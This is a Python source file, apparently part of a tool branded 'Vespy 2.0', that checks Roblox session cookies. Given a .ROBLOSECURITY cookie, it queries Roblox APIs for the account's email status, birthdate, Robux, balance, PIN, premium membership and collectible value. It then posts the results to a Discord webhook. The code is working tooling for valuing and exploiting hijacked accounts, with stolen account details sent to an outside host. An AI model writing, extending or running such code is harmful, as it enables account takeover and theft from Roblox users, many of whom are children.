import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

def CookieCheckar(webhook, cookie:str, allinfo):
    if allinfo:
        try:
            r=requests.get("https://accountsettings.roblox.com/v1/email",cookies={'.ROBLOSECURITY': cookie}).json()
            if "verified" in r:
                EMAILVERIF = bool(r["verified"])
                if EMAILVERIF:EMAILVERIF=":white_check_mark:"
                else:EMAILVERIF=":x:"
                r=requests.get("https://users.roblox.com/v1/users/authenticated",cookies={'.ROBLOSECURITY': cookie}).json()
                ID = r["id"]
                NAME = r["name"]
                DISPLAYNAME = r["displayName"]
                r=requests.get("https://billing.roblox.com/v1/credit",cookies={'.ROBLOSECURITY': cookie}).json()
                BALANCE = r["balance"]
                ROBUX = r["robuxAmount"]
                r=requests.get("https://accountinformation.roblox.com/v1/birthdate",cookies={'.ROBLOSECURITY': cookie}).json()
                BIRTH = f"{r['birthYear']}-{r['birthMonth']}-{r['birthDay']}"
                r=requests.get(f"https://premiumfeatures.roblox.com/v1/users/{ID}/validate-membership",cookies={'.ROBLOSECURITY': cookie}).json()
                if bool(r):PREMIUM = ":white_check_mark:"
                else:PREMIUM = ":x:"
                r=requests.get(f"https://auth.roblox.com/v1/account/pin",cookies={'.ROBLOSECURITY': cookie}).json()
                if bool(r['isEnabled']):PIN=":white_check_mark:"
                else:PIN = ":x:"
                r = requests.get(f'https://inventory.roblox.com/v1/users/{ID}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
                while r['nextPageCursor'] != None:r = requests.get(f'https://inventory.roblox.com/v1/users/{ID}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
                RAP = sum(i['recentAveragePrice'] for i in r['data'])
                IMAGE=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={ID}&size=420x420&format=Png&isCircular=false").json()["data"][0]["imageUrl"]
                webhook = DiscordWebhook(url=webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Cookie Checker", description=f"Cookie of : ``{NAME}``", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.add_embed_field(name=":ballot_box_with_check: Premium : ",value=f"{PREMIUM}")
                embed.add_embed_field(name=":lock: Pin : ",value=f"{PIN}")
                embed.add_embed_field(name=":email: Email Verified : ",value=f"{EMAILVERIF}")
                embed.add_embed_field(name=":id: ID : ",value=f"``{ID}``")
                embed.add_embed_field(name=":baby: Display Name : ",value=f"``{DISPLAYNAME}``")
                embed.add_embed_field(name=":birthday: Birth : ",value=f"``{BIRTH}``")
                embed.add_embed_field(name=":coin: Balance : ",value=f"``{BALANCE}``")
                embed.add_embed_field(name=":dollar: Robux : ",value=f"``{ROBUX}``")
                embed.add_embed_field(name=":gem: RAP : ",value=f"``{RAP}``")
                embed.add_embed_field(name="\n:globe_with_meridians: Rolimons : ",value=f"**https://www.rolimons.com/player/{ID}**")
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_thumbnail(url=IMAGE)
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()
            else:
                webhook = DiscordWebhook(url=webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Cookie Checker", description=f":x: **Cookie Is Invalid** :x:", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()
        except:
            webhook = DiscordWebhook(url=webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"Cookie Checker", description=f":x: **Cookie Is Invalid** :x:", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
    else:
        try:
            r=requests.get("https://accountsettings.roblox.com/v1/email",cookies={'.ROBLOSECURITY': cookie}).json()
            if "verified" in r:
                r=requests.get("https://users.roblox.com/v1/users/authenticated",cookies={'.ROBLOSECURITY': cookie}).json()
                NAME = r["name"]
                ID=r["id"]
                IMAGE=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={ID}&size=420x420&format=Png&isCircular=false").json()["data"][0]["imageUrl"]
                webhook = DiscordWebhook(url=webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Cookie Checker", description=f"Valid Cookie of ``{NAME}``", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                embed.set_thumbnail(url=IMAGE)
                webhook.add_embed(embed)
                webhook.execute()
            else:
                webhook = DiscordWebhook(url=webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                embed = DiscordEmbed(title=f"Cookie Checker", description=f":x: **Cookie Is Invalid** :x:", color='4300d1')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                embed.set_footer(text='Vespy 2.0 | by : vesper')
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()
        except:
            webhook = DiscordWebhook(url=webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"Cookie Checker", description=f":x: **Cookie Is Invalid** :x:", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()